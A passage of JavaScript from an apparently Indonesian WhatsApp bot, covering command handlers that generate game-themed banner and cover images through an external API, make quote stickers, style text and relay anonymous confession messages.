'skarner-3', 'skarner-2', 'skarner-1', 'skarner-0', 'sivir-7', 'sivir-6', 'sivir-5', 'sivir-4', 'sivir-3', 'sivir-2', 'sivir-1', 'sivir-0', 'sion-5', 'sion-4', 'sion-3', 'sion-2', 'sion-1', 'sion-0', 'singed-8', 'singed-7', 'singed-6', 'singed-5', 'singed-4', 'singed-3', 'singed-2', 'singed-1', 'singed-0', 'shyvana-6', 'shyvana-5', 'shyvana-4', 'shyvana-3', 'shyvana-3', 'shyvana-2', 'shyvana-1', 'shyvana-0', 'shen-6', 'shen-5', 'shen-4', 'shen-3', 'shen-2', 'shen-1', 'shen-0', 'shaco-7', 'shaco-6', 'shaco-5', 'shaco-4', 'shaco-3', 'shaco-2', 'shaco-1', 'shaco-0', 'sejuani-7', 'sejuani-6', 'sejuani-5', 'sejuani-4', 'sejuani-3', 'sejuani-2', 'sejuani-1', 'sejuani-0', 'ryze-10', 'ryze-9', 'ryze-8', 'ryze-7', 'ryze-6', 'ryze-5', 'ryze-4', 'ryze-3', 'ryze-2', 'ryze-1', 'ryze-0', 'rumble-3', 'rumble-2', 'rumble-1', 'rumble-0', 'riven-8', 'riven-7', 'riven-6', 'riven-5', 'riven-4', 'riven-3', 'riven-2', 'riven-1', 'riven-0', 'rengar-3', 'rengar-2', 'rengar-1', 'rengar-0', 'renekton-9', 'renekton-8', 'renekton-7', 'renekton-6', 'renekton-5', 'renekton-4', 'renekton-3', 'renekton-2', 'renekton-1', 'renekton-0', 'reksai-1', 'reksai-2', 'reksai-0', 'rammus-7', 'rammus-6', 'rammus-5', 'rammus-4', 'rammus-3', 'rammus-2', 'rammus-1', 'rammus-0', 'rakan-1', 'rakan-0', 'quinn-4', 'quinn-3', 'quinn-2', 'quinn-1', 'quinn-0', 'poppy-7', 'poppy-6', 'poppy-5', 'poppy-4', 'poppy-3', 'poppy-2', 'poppy-1', 'poppy-0', 'pantheon-8', 'pantheon-7', 'pantheon-6', 'pantheon-5', 'pantheon-4', 'pantheon-3', 'pantheon-2', 'pantheon-1', 'pantheon-0', 'orianna-7', 'orianna-6', 'orianna-5', 'orianna-4', 'orianna-3', 'orianna-2', 'orianna-1', 'orianna-0', 'olaf-6', 'olaf-5', 'olaf-4', 'olaf-3', 'olaf-2', 'olaf-1', 'olaf-0', 'nunu-7', 'nunu-6', 'nunu-5', 'nunu-4', 'nunu-3', 'nunu-2', 'nunu-1', 'nunu-0', 'nocturne-6', 'nocturne-5', 'nocturne-4', 'nocturne-3', 'nocturne-2', 'nocturne-1', 'nocturne-0', 'nidalee-8', 'nidalee-7', 'nidalee-6', 'nidalee-5', 'nidalee-4', 'nidalee-3', 'nidalee-2', 'nidalee-1', 'nidalee-0', 'nautilus-5', 'nautilus-4', 'nautilus-3', 'nautilus-2', 'nautilus-1', 'nautilus-0', 'nasus-6', 'nasus-5', 'nasus-4', 'nasus-3', 'nasus-2', 'nasus-1', 'nasus-0', 'nasus-10', 'nami-7', 'nami-6', 'nami-5', 'nami-4', 'nami-3', 'nami-2', 'nami-1', 'nami-0', 'norgana-6', 'norgana-5', 'norgana-4', 'norgana-3', 'norgana-2', 'norgana-1', 'norgana-0', 'norgana-10', 'norgana-11', 'nordekaiser-4', 'nordekaiser-3', 'nordekaiser-2', 'nordekaiser-1', 'nordekaiser-0', 'nonkeyking-5', 'nonkeyking-4', 'nonkeyking-3', 'nonkeyking-2', 'nonkeyking-1', 'nonkeyking-0', 'nissfortune-9', 'nissfortune-8', 'nissfortune-7', 'nissfortune-6', 'nissfortune-5', 'nissfortune-4', 'nissfortune-3', 'nissfortune-2', 'nissfortune-1', 'nissfortune-0', 'nasteryi-3', 'nasteryi-2', 'nasteryi-1', 'nasteryi-0', 'nasteryi-9', 'nasteryi-5', 'nasteryi-4', 'nasteryi-10', 'naokai-7', 'naokai-6', 'naokai-5', 'naokai-4', 'naokai-3', 'naokai-2', 'naokai-1', 'naokai-0', 'nalzahar-5', 'nalzahar-4', 'nalzahar-3', 'nalzahar-2', 'nalzahar-1', 'nalzahar-0', 'nalphite-7', 'nalphite-6', 'nalphite-5', 'nalphite-4', 'nalphite-3', 'nalphite-2', 'nalphite-1', 'nalphite-0', 'lux-7', 'lux-6', 'lux-5', 'lux-4', 'lux-3', 'lux-2', 'lux-1', 'lux-0', 'lulu-6', 'lulu-5', 'lulu-4', 'lulu-3', 'lulu-2', 'lulu-1', 'lulu-0', 'lucian-6', 'lucian-7', 'lucian-2', 'lucian-1', 'lucian-0', 'lissandra-3', 'lissandra-2', 'lissandra-1', 'lissandra-0', 'leona-9', 'leona-8', 'leona-7', 'leona-6', 'leona-5', 'leona-4', 'leona-3', 'leona-2', 'leona-1', 'leona-0', 'leesin-6', 'leesin-5', 'leesin-4', 'leesin-3', 'leesin-2', 'leesin-1', 'leesin-0', 'leesin-10', 'leesin-11', 'leblanc-5', 'leblanc-4', 'leblanc-3', 'leblanc-2', 'leblanc-1', 'leblanc-0', 'kogmaw-9', 'kogmaw-8', 'kogmaw-7', 'kogmaw-6', 'kogmaw-5', 'kogmaw-4', 'kogmaw-3', 'kogmaw-2', 'kogmaw-1', 'kogmaw-0', 'kled-1', 'kled-0', 'kindred-2', 'kindred-1', 'kindred-0', 'khazix-4', 'khazix-3', 'khazix-2', 'khazix-1', 'khazix-0', 'kennen-7', 'kennen-6', 'kennen-5', 'kennen-4', 'kennen-3', 'kennen-2', 'kennen-1', 'kennen-0', 'kayle-8', 'kayle-7', 'kayle-6', 'kayle-5', 'kayle-4', 'kayle-3', 'kayle-2', 'kayle-1', 'kayle-0', 'katarina-9', 'katarina-8', 'katarina-7', 'katarina-5', 'katarina-6', 'katarina-4', 'katarina-3', 'katarina-2', 'katarina-1', 'kassadin-4', 'kassadin-3', 'kassadin-2', 'kassadin-1', 'kassadin-0', 'karthus-9', 'karthus-5', 'karthus-4', 'karthus-3', 'karthus-2', 'karthus-1', 'karthus-0', 'karma-7', 'karma-6', 'karma-5', 'karma-4', 'karma-3', 'karma-2', 'karma-1', 'karma-0', 'kalista-3', 'kalista-2', 'kalista-1', 'kalista-0', 'jinx-4', 'jinx-3', 'jinx-2', 'jinx-1', 'jinx-0', 'jayce-4', 'jayce-3', 'jayce-2', 'jayce-1', 'jayce-0', 'jax-9', 'jax-8', 'jax-7', 'jax-6', 'jax-5', 'jax-4', 'jax-3', 'jax-2', 'jax-1', 'jax-0', 'jarvaniv-6', 'jarvaniv-5', 'jarvaniv-4', 'jarvaniv-3', 'jarvaniv-2', 'jarvaniv-1', 'jarvaniv-0', 'janna-7', 'janna-6', 'janna-5', 'janna-4', 'janna-3', 'janna-2', 'janna-1', 'ivern-1', 'ivern-0', 'irelia-5', 'irelia-4', 'irelia-3', 'irelia-2', 'irelia-1', 'irelia-0', 'illaoi-1', 'illaoi-0', 'heimerdinger-5', 'heimerdinger-4', 'heimerdinger-3', 'heimerdinger-2', 'heimerdinger-1', 'heimerdinger-0', 'hecarim-6', 'hecarim-5', 'hecarim-4', 'hecarim-3', 'hecarim-2', 'hecarim-1', 'hecarim-0', 'graves-7', 'graves-6', 'graves-5', 'graves-4', 'graves-3', 'graves-2', 'graves-1', 'graves-0', 'gragas-9', 'gragas-8', 'gragas-7', 'gragas-6', 'gragas-5', 'gragas-4', 'gragas-3', 'gragas-3', 'gragas-2', 'gragas-1', 'gragas-0', 'gnar-4', 'gnar-3', 'gnar-2', 'gnar-1', 'gnar-0', 'garen-6', 'garen-5', 'garen-4', 'garen-3', 'garen-2', 'garen-1', 'garen-0', 'garen-10', 'garen-11', 'gangplank-8', 'gangplank-7', 'gangplank-6', 'gangplank-5', 'gangplank-4', 'gangplank-3', 'gangplank-2', 'gangplank-1', 'gangplank-0', 'galio-5', 'galio-4', 'galio-3', 'galio-2', 'galio-1', 'galio-0', 'fizz-9', 'fizz-8', 'fizz-4', 'fizz-3', 'fizz-2', 'fizz-1', 'fizz-0', 'fiora-5', 'fiora-4', 'fiora-3', 'fiora-2', 'fiora-1', 'fiora-0', 'fiddlesticks-7', 'fiddlesticks-6', 'fiddlesticks-5', 'fiddlesticks-4', 'fiddlesticks-3', 'fiddlesticks-2', 'fiddlesticks-1', 'fiddlesticks-0', 'ezreal-9', 'ezreal-8', 'ezreal-7', 'ezreal-6', 'ezreal-5', 'ezreal-4', 'ezreal-3', 'ezreal-2', 'ezreal-1', 'ezreal-0', 'evelynn-4', 'evelynn-3', 'evelynn-2', 'evelynn-1', 'evelynn-0', 'elise-4', 'elise-3', 'elise-2', 'elise-1', 'elise-0', 'ekko-3', 'ekko-2', 'ekko-1', 'ekko-0', 'draven-6', 'draven-5', 'draven-4', 'draven-3', 'draven-2', 'draven-1', 'draven-0', 'drmundo-9', 'drmundo-8', 'drmundo-7', 'drmundo-6', 'drmundo-5', 'drmundo-4', 'drmundo-3', 'drmundo-2', 'drmundo-1', 'drmundo-0', 'diana-3', 'diana-2', 'diana-1', 'diana-0', 'diana-11', 'darius-8', 'darius-4', 'darius-3', 'darius-2', 'darius-1', 'darius-0', 'darius-14', 'corki-8', 'corki-7', 'corki-6', 'corki-5', 'corki-4', 'corki-3', 'corki-2', 'corki-1', 'corki-0', 'chogath-6', 'chogath-5', 'chogath-4', 'chogath-3', 'chogath-2', 'chogath-1', 'chogath-0', 'cassiopeia-4', 'cassiopeia-3', 'cassiopeia-2', 'cassiopeia-1', 'cassiopeia-0', 'camille-1', 'camille-0', 'caitlyn-6', 'caitlyn-5', 'caitlyn-4', 'caitlyn-3', 'caitlyn-2', 'caitlyn-1', 'caitlyn-0', 'caitlyn-10', 'caitlyn-11', 'braum-3', 'braum-2', 'braum-1', 'braum-0', 'braum-10', 'brand-5', 'brand-4', 'brand-3', 'brand-2', 'brand-1', 'brand-0', 'blitzcrank-7', 'blitzcrank-6', 'blitzcrank-5', 'blitzcrank-4', 'blitzcrank-3', 'blitzcrank-2', 'blitzcrank-1', 'blitzcrank-0', 'blitzcrank-11', 'bard-6', 'bard-5', 'bard-4', 'bard-3', 'bard-2', 'bard-1', 'bard-0', 'azir-4', 'azir-3', 'azir-2', 'azir-1', 'azir-0', 'aurelionsol-1', 'aurelionsol-0', 'ashe-8', 'ashe-7', 'ashe-6', 'ashe-5', 'ashe-4', 'ashe-3', 'ashe-2', 'ashe-1', 'ashe-0', 'annie-9', 'annie-8', 'annie-7', 'annie-6', 'annie-5', 'annie-4', 'annie-3', 'annie-2', 'annie-1', 'annie-0', 'annie-10', 'anivia-7', 'anivia-6', 'anivia-5', 'anivia-4', 'anivia-3', 'anivia-2', 'anivia-1', 'anivia-0', 'amumu-8', 'amumu-7', 'amumu-6', 'amumu-5', 'amumu-4', 'amumu-3', 'amumu-2', 'amumu-1', 'amumu-0', 'alistar-9', 'alistar-8', 'alistar-7', 'alistar-6', 'alistar-5', 'alistar-4', 'alistar-3', 'alistar-2', 'alistar-1', 'alistar-0', 'akali-8', 'akali-7', 'akali-6', 'akali-5', 'akali-4', 'akali-3', 'akali-2', 'akali-1', 'akali-0', 'ahri-7', 'ahri-6', 'ahri-5', 'ahri-4', 'ahri-3', 'ahri-2', 'ahri-1', 'ahri-0', 'aatrox-3', 'aatrox-2', 'aatrox-1', 'aatrox-0', 'zacskt', 'teemoskt', 'olafskt', 'namiskt', 'syndraskt', 'jhinskt', 'ekkoskt', 'urgot-8', 'urgot-7', 'urgot-6', 'urgot-5', 'kayn-2', 'kayn', 'sona-8', 'veigaros', 'twitchos', 'tristanaos', 'fizzos', 'zigg', 'nalzah01', 'kayle', 'hecarim', 'brand', 'ornn2', 'ornn', 'syndra', 'soraka', 'nissfortune', 'ezreal', 'ahri', 'yorick', 'singed', 'nasteryi', 'janna', 'fiora', 'cassiopeia', 'ashe', 'zed', 'viktor', 'nidalee', 'katarina', 'gnar', 'evelynn-7', 'evelynn-6', 'evelynn-5', 'evelynn', 'elise', 'annie', 'rengar', 'blitzcrank-9', 'blitzcrank-8', 'zoe-2', 'zoe', 'vi', 'vayne', 'varus', 'poppy', 'kogmaw', 'jinx', 'jhin', 'jax', 'graves', 'draven', 'xinzhao', 'warwick', 'swain-8', 'swain-7', 'swain-6', 'swain-5', 'swain-4', 'rakan', 'nasus', 'nissfortune-15', 'nissfortune-14', 'nissfortune-13', 'nissfortune-12', 'nissfortune-11', 'nissfortune-10', 'lux', 'kaisa-2', 'kaisa', 'jarvan-iv', 'illaoi', 'gragas', 'wukong', 'sivir', 'nissfortune-16', 'irelia-11', 'irelia-10', 'irelia-9', 'irelia-8', 'irelia-7', 'irelia-6', 'galio', 'alistar', 'varus-7', 'twistedfate', 'teemo', 'shen', 'rumble', 'riven', 'evelynn-8', 'zoe3', 'xinzhao-7', 'urgot', 'thresh', 'talon', 'taliya', 'pyke-2', 'pyke', 'poppy-8', 'nunu-15', 'nunu-14', 'nunu-13', 'nunu-12', 'nunu-11', 'nunu-10', 'nunu-9', 'nunu-8', 'lulu', 'lucian', 'jarvan-iv-7', 'irelia-12', 'garen', 'gangplank', 'darius', 'caitlyn', 'braum', 'aurelionsol-2', 'ashe-9', 'akali-18', 'akali-17', 'akali-16', 'akali-15', 'akali-14', 'akali-13', 'akali-12', 'akali-11', 'akali-10', 'akali-9', 'aatrox-7', 'aatrox-6', 'aatrox-5', 'aatrox-4', 'ziggs-6', 'yasuo', 'sona', 'nalphite', 'khazix', 'kayn-3', 'jinx-5']
                if (!style.includes(m2)) {
                    getStyle(style.length, "style")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        style: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'lolcoverbyname': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|avatar\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|xinzhao`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|avatar\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|xinzhao`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['zyra', 'zilean', 'ziggs', 'zed', 'zac', 'yorick', 'yasuo', 'xinzhao', 'xerath', 'xayah', 'wukong', 'warwick', 'volibear', 'vladimir', 'viktor', 'vi', 'velkoz', 'veigar', 'vayne', 'varus', 'urgot', 'udyr', 'twictch', 'tryndamere', 'trundle', 'tristana', 'thresh', 'twistedfate', 'teemo', 'taric', 'talon', 'taliyah', 'tahmkench', 'syndra', 'swain', 'soraka', 'sona', 'skarner', 'sivir', 'sion', 'singed', 'shyvana', 'shen', 'shaco', 'sejuani', 'ryze', 'rumble', 'riven', 'rengar', 'renekton', 'reksai', 'rammus', 'rakan', 'quinn', 'poppy', 'pantheon', 'orianna', 'olaf', 'nunu', 'nasteryi', 'naokai', 'nalzahar', 'nalphite', 'lux', 'lulu', 'lucian', 'nocturne', 'nedalee', 'nautilus', 'nasus', 'nami', 'norgana', 'noderkaiser', 'nissfortune', 'lissandra', 'leona', 'leesin', 'leblanc', 'kogmaw', 'kled', 'kindred', 'khazix', 'kennen', 'kayn', 'kayle', 'katarina', 'kassadin', 'karthus', 'karma', 'kalista', 'jinx', 'jhin', 'jayce', 'jax', 'jarvan', 'janna', 'ivern', 'irelia', 'illaoi', 'heimerdinger', 'hecarim', 'graves', 'gragas', 'gnar', 'garen', 'gangplank', 'galio', 'fizz', 'fiora', 'fiddlesticks', 'ezreal', 'drmundo', 'evelynn', 'elise', 'ekko', 'draven', 'diana', 'darius', 'corki', 'chogath', 'cassiopeia', 'camille', 'caitlyn', 'braum', 'brand', 'blitzcrank', 'bard', 'azir', 'aurelionsol', 'ashe', 'annie', 'anivia', 'amumu', 'alistar', 'akali', 'ahri', 'aatrox', 'zoe', 'sylas', 'swain-2', 'pyke', 'nunu-2', 'neeko', 'norgana2', 'kayle-2', 'kaisa', 'evelynn-2', 'aatrox-2']
                if (!style.includes(m2)) {
                    getStyle(style.length, "avatar")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        avatar: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'cyberhunterfb': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|1`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|1`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12']
                if (!style.includes(m2)) {
                    getStyle(style.length, "character")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        character: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'coverfreefirefb': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|laura`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|laura`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['a124', 'alok', 'alvaro', 'andrew', 'antonio', 'caroline', 'hayato', 'kapella', 'kelly', 'kla', 'laura', 'naxim', 'niguel', 'nisa', 'noco', 'nikita', 'notora', 'olivia', 'paloma', 'rafael', 'shani', 'steffie']
                if (!style.includes(m2)) {
                    getStyle(style.length, "character")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        character: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
           case 'quickchat':
           case 'quikchat':
           case 'quikcat':
           case 'quickcat':
           case 'qc': {
           if (isBan) return reply(mess.ban)
           if (!quoted){
const getname = await tganz.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#000000",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 2,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
tganz.sendImageAsSticker(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#000000",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 2,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
tganz.sendImageAsSticker(from, buffer, m, opt)
});
} else {
reply(`*❑ Contoh Penggunaan : ${prefix + command} Test Ganteng*`)
}
}
break
            case 'quikchatimg':
            case 'quikcatimg':
            case 'qcimage':
            case 'quickchatimg':
            case 'qcimg': {
           if (isBan) return reply(mess.ban)
           if (!q) return reply(`*❑ Contoh Penggunaan : ${prefix + command} Test Ganteng*`)
           let ppnyauser = await await tganz.profilePictureUrl(m.sender, 'image').catch(_=> 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
            tganz.sendFile(m.chat, rest.result, `${text}.jpg`, mess.done, m)
            }
            break
            case 'gamingmascot': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|bear`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|bear`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['bear-2', 'dragon-2', 'hydra', 'lion', 'reaper', 'wolf-2', 'bear', 'eagle', 'iguana', 'shark', 'snake', 'spartan', 'griffin', 'owl', 'wolf', 'tiger', 'wolver', 'dragon']
                if (!style.includes(m2)) {
                    getStyle(style.length, "style")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        style: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'coveronepiecefb': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|ace`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|ace`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['ace', 'brook', 'chopper', 'franky', 'garp', 'jinbei', 'law', 'luffy', 'nerry', 'nami', 'rayleigh', 'robin', 'sabo', 'sanji', 'shanks', 'sunny', 'usopp', 'zoro']
                if (!style.includes(m2)) {
                    getStyle(style.length, "character")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        character: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'confes': 
            case 'confess': 
            case 'menfes': 
            case 'menfess': {
		        if (!isPrivate) return reply(mess.pc)
            	if (!text) return reply(`Mau ${command} ke siapa kak ?\n*❑ Contoh Penggunaan : #${command} 62895xxx|Reza|Hello Bro*\n\n*❑ Nomor harus berupa angka jangan pakai + langsung saja 628xxxx*\n*❑ Jangan lupa beri tanda °|° untuk mensplit sebagaimana menfess akan lebih work it !!!*`)
            var mon = args.join(' ')
            var m1 = mon.split("|")[0]
            var m2 = mon.split("|")[1]
            var m3 = mon.split("|")[2]
               let mq1 = m1 + '@s.whatsapp.net'
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
               let pjtxt = `🗣️ *Hᴀɪ ᴋᴀᴋᴀᴋ ᴀᴋᴜ ʀᴏʙᴏᴛ ᴀᴅᴀ ᴘᴇsᴀɴ ɴɪʜ ᴜɴᴛᴜᴋ ᴋᴀᴍᴜ !!!*\n\n❑ *Pᴇsᴀɴ ᴅᴀʀɪ* : ⟨ ${m2} ⟩\n❑ *Uɴᴛᴜᴋ ᴋᴀᴋᴀᴋ* : @${mq1.split('@')[0]}\n\n══════════════════════⊙\n\n❑ *Pᴇsᴀɴɴʏᴀ* :\n*⫹⫺>* ⟨ ${m3} ⟩\n\n══════════════════════⊙\n`
            await tganz.sendMessage(mq1, { image: mnfs, caption: pjtxt }, { mentions: ments, qouted: fkontak })
            let akhji = `🗣️ *Hᴀɪ Kᴀᴋᴀᴋ* : ${pushname}\n═════════════════❑\n❑ *Pᴇsᴀɴ ᴋᴀᴍᴜ ᴛᴇʟᴀʜ ᴅɪ ᴋɪʀɪᴍ !!!*\n❑ *Kᴇᴘᴀᴅᴀ* : ⟨ @${mq1.split('@')[0]} ⟩\n═════════════════❑\n\n🗣️ ᴜɴᴛᴜᴋ ᴍᴇᴍᴀsᴛɪᴋᴀɴ ʙᴀʜᴡᴀ ᴘᴇsᴀɴ ᴅᴀʀɪ ʙᴏᴛ ᴛᴇʟᴀʜ ᴅɪ ᴋɪʀɪᴍ sɪʟᴀʜᴋᴀɴ ᴄᴏʙᴀ ᴛᴀɴʏᴀᴋᴀɴ ᴋᴇᴘᴀᴅᴀ ᴛᴀʀɢᴇᴛ ᴛᴇɴᴛᴀɴɢ ᴘᴇɴɢɪʀɪᴍᴀɴ ᴄʜᴀᴛ ʏᴀɴɢ ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇɴᴀʟ !!!`
            await tganz.sendMessage(m.chat, { image: thumb, caption: akhji }, { mentions: ments, qouted: m })
            }
            break
            case 'style': 
            case 'styletext': {
            if (isBan) return reply(mess.ban)
              		let { styletext } = require('./lib/scraper')
              		if (!text) return reply(`Tᴇᴋsɴʏᴀ Mᴀɴᴀ ᴋᴀᴋ ?\n\n*❑ Cᴏɴᴛᴏʜ : ${prefix + command} TᴇsᴛGᴀɴᴢ*`)
              		reply(mess.wait)
                let anu = await styletext(text)
                let teks = `Hᴀsɪʟ ᴅᴀʀɪ ᴘᴇᴍʙᴜᴀᴛᴀɴ Sᴛʏʟᴇ~Tᴇxᴛ : ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                reply(teks)
	    }
	    break
            case 'bannerytcsgo': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|template\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|banner-7`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|template\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|banner-7`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['banner-1', 'banner-2', 'banner-3', 'banner-4', 'banner-5', 'banner-6', 'banner-7']
                if (!style.includes(m2)) {
                    getStyle(style.length, "banner")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        banner: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'fbgamepubgcover': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|template\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|cover-4`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|template\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|cover-4`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['cover-1', 'cover-2', 'cover-3', 'cover-4', 'cover-5', 'cover-6', 'cover-7', 'cover-8', 'cover-9', 'cover-10', 'cover-11', 'cover-12']
                if (!style.includes(m2)) {
                    getStyle(style.length, "template")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        template: m2
                    }, 'apikey'))
